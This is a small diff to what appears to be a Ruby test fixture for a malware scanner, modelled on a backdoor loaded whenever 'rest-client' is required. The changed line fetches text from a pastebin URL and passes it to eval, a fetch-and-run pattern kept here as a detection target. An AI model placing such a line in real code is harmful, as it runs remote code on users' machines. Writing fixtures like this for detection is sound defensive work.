@@ -10,4 +10,4 @@ end
 # loaded at every `require 'rest-client'`.
 #
 # Detection target: dynamic-eval + net-egress + suspicious-URL.
-eval(Net::HTTP.get(URI('https://pastebin.com/raw/xxxxxxxx')))
+eval(Net::HTTP.get(URI('https://pastebin.com/raw/aegis-test-fixture-not-a-real-paste')))
